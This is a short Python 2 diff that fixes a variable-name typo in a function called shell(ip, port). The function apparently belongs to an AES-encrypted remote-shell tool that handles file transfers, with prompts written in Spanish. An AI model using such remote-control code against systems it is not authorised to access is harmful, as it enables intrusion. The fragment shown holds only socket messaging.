@@ -211,7 +211,7 @@ def shell(ip, port):
                 response = "¿Cual es el nombre que quiere que tenga en el destino (indique ext): "           
                 encoded = encodeCipher(aes, response)
                 s.send(encoded)
-                fileame = decodeCipher(aes, s.recv(4096)) #Receive filename
+                filename = decodeCipher(aes, s.recv(4096)) #Receive filename
                 print filename
                 encoded = encodeCipher(aes, 'OK')
                 s.send(encoded)
